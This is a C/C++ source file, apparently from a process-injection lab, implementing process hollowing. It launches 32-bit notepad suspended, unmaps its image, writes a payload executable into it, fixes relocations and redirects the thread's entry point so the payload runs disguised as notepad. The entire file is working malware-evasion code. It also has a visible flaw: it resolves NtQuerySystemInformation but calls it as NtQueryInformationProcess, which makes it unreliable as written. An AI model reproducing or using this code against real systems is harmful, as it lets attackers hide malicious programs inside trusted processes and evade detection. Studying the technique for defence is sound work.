#include <windows.h>
#include <stdio.h>
#include "hollo.h"


void FixRelocation(HANDLE tpHandle, LPVOID payloadBytesBuffer, PIMAGE_NT_HEADERS payloadNTHeaders, PIMAGE_SECTION_HEADER payloadImageSection, LPVOID targetImageBase, DWORD deltaBase) {
    IMAGE_DATA_DIRECTORY relocTable = (IMAGE_DATA_DIRECTORY)payloadNTHeaders->OptionalHeader.DataDirectory[5];

    for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++){
        BYTE* sectionName = (BYTE*)".reloc";
        if(memcmp(&payloadImageSection->Name, sectionName, 5) != 0) {
            payloadImageSection++;
            continue;
        }

        // being here means we are at the .reloc section
        DWORD payloadRawData = payloadImageSection->PointerToRawData;
        DWORD relocOffset = 0;
        DWORD bytesRead = 0;
        SIZE_T* pBytesRead = 0;

        while(relocOffset < relocTable.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);
            relocOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((DWORD)payloadBytesBuffer + payloadRawData + relocOffset);

            for (DWORD x=0; x < relocEntryCount; x++) {
                relocOffset += sizeof(BASE_RELOCATION_ENTRY);
                if(relocEntries[x].Type == 0) {
                    continue;
                }
                DWORD relocationRVA = relocationBlock->PageAddress + relocEntries[x].Offset;
                DWORD addressToPatch = 0;
                ReadProcessMemory(tpHandle, (LPCVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), &bytesRead);
                addressToPatch += deltaBase;
                WriteProcessMemory(tpHandle, (PVOID)((DWORD)targetImageBase + relocationRVA), &addressToPatch, sizeof(DWORD), &bytesRead);
            }
        }
    }
}

int main() {
    _NtQueryInformationProcess pNtQuerySystemInformation = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (pNtQuerySystemInformation == NULL) {
        printf("[-] Failed to load NtQueryInformationProcess \n");
        exit(-1);
    }

    // Creating a process in suspended state
    LPSTARTUPINFOA startInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION* procBasicInfo = new PROCESS_BASIC_INFORMATION();
    HANDLE hPayload = NULL;
    DWORD payloadFileSize = 0;

    printf("[+] Opening 32-bit notepad process in suspended mode \n");
    LPSTR procName = (LPSTR)"C:\\windows\\syswow64\\notepad.exe";
    if(!CreateProcessA(NULL, procName, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
        perror("[-] Error creating the process in suspended state \n");
        exit(-1);
    }
    printf("[+] Process created in suspended state\n");

    // Getting target process handle
    HANDLE tpHandle = procInfo->hProcess;
    DWORD retLen = 0;
    // Getting target base offset address
    pNtQuerySystemInformation(tpHandle, ProcessBasicInformation, procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
    DWORD pebImageBaseOffset = (DWORD)procBasicInfo->PebBaseAddress + 8;
    printf("[+] Target process base image offset is: %p\n", pebImageBaseOffset);
    // Getting target image base address
    LPVOID targetImageBase = 0;
    SIZE_T bytesRead = 0;
    if(!ReadProcessMemory(tpHandle, (LPCVOID)pebImageBaseOffset, &targetImageBase, 4, &bytesRead)) {
        int lastError = GetLastError();
        perror("[-] Error reading the target image base address \n");
        exit(-1);
    }
    printf("[+] Target process image base address: %p\n", targetImageBase);

    // Getting handle to the malicious payload
    hPayload = CreateFileA("C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ProcessHollowing\\Payload32\\payload32.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    if (hPayload == INVALID_HANDLE_VALUE) {
        perror("[-] Error opening handle to the payload\n");
        exit(-1);
    }
    payloadFileSize = GetFileSize(hPayload, NULL);
    // writing malicious payload to the memory
    LPVOID payloadBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadFileSize);
    printf("[+] Allocated memory for payload in current process : %p \n", payloadBytesBuffer);
    ReadFile(hPayload, payloadBytesBuffer, payloadFileSize, &bytesRead, NULL);

    // Parsing the PE and get image size
    PIMAGE_DOS_HEADER payloadDOSHeader = (PIMAGE_DOS_HEADER)payloadBytesBuffer;
    PIMAGE_NT_HEADERS payloadNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)payloadBytesBuffer + payloadDOSHeader->e_lfanew);
    SIZE_T imageSize = (DWORD)payloadNTHeaders->OptionalHeader.SizeOfImage;

    // Hollowing the target process
    _ZwUnmapViewOfSection pZwUnmapViewOfSection = (_ZwUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection");
    if (pZwUnmapViewOfSection == NULL) {
        printf("[-] Failed to load ZwUnmapViewOfSection \n");
        exit(-1);
    }

    pZwUnmapViewOfSection(tpHandle, targetImageBase);
    printf("[+] Successfully unmapped view of section\n");

    // Allocate new memory in the target process
    LPVOID newTargetImageBase = VirtualAllocEx(tpHandle, targetImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    targetImageBase = newTargetImageBase;
    printf("[+] Target process new image base: %p \n", targetImageBase);
    // Delta between image base address and remote process base address
    DWORD deltaBase = (DWORD)targetImageBase - payloadNTHeaders->OptionalHeader.ImageBase; // this is used in the relocations
    // used to calculate the offsets in the payload32.exe malicious payload

    // Setting the source image base to the target image base and copying the paload image headers to the target image address
    payloadNTHeaders->OptionalHeader.ImageBase = (DWORD)targetImageBase;
    WriteProcessMemory(tpHandle, targetImageBase, payloadBytesBuffer, payloadNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // COpy all sections of the malicious payload to the target process
    PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER)((DWORD)payloadBytesBuffer + 
    payloadDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    PIMAGE_SECTION_HEADER oldImageSection = payloadImageSection;

    for(int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++) {
        PVOID targetSectionLocation = (PVOID)((DWORD)targetImageBase + payloadImageSection->VirtualAddress);
        PVOID payloadSectionLocation = (PVOID)((DWORD)payloadBytesBuffer + payloadImageSection->PointerToRawData);
        WriteProcessMemory(tpHandle, targetSectionLocation, payloadSectionLocation, payloadImageSection->SizeOfRawData, NULL);
        payloadImageSection++;
    }

    payloadImageSection = oldImageSection;

    // core of preocess hollowing - relocation, aka patching of fixed or hardcoded addresses inside malicious payload
    FixRelocation(tpHandle, payloadBytesBuffer, payloadNTHeaders, payloadImageSection, targetImageBase, deltaBase);

    // fix entry point to point to the start of malicious hollowed payload
    DWORD entryPoint = (DWORD)targetImageBase + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint;
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    printf("[+] Getting thread context... \n");
    if(!GetThreadContext(procInfo->hThread, pContext)){
        perror("[-] Error getting thread context ...\n");
        exit(-1);
    }
    printf("[+] Setting thread context\n");
    // change of control flow at entry point
    pContext->Eax = entryPoint;
    if(!SetThreadContext(procInfo->hThread, pContext)){
        perror("[+] Error setting thread context\n");
        exit(-1);
    }
    printf("[+] Resuming thread\n");
    ResumeThread(procInfo->hThread);
}